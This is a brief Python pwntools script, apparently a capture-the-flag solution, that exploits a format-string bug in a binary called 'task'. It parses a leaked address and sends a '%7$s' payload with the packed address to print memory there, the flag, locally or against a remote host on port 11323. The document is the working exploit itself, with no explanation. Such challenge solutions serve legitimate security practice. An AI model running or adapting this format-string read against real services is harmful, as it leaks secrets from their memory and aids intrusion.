from pwn import *

elf = context.binary = ELF('./task')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main",
		"c"
	]))
elif args.REMOTE:
	p = remote("localhost" if not args.ADDR else args.ADDR, 11323)
else:
	p = process(elf.path)

addr = p.recvline().strip().split()[-1]
addr = int(addr.decode(), 16)

print(f"flag addr: {hex(addr)}")
p.sendline(b'%7$s' + b'\x00' * 4 + p64(addr))

print(p.clean(1.0))
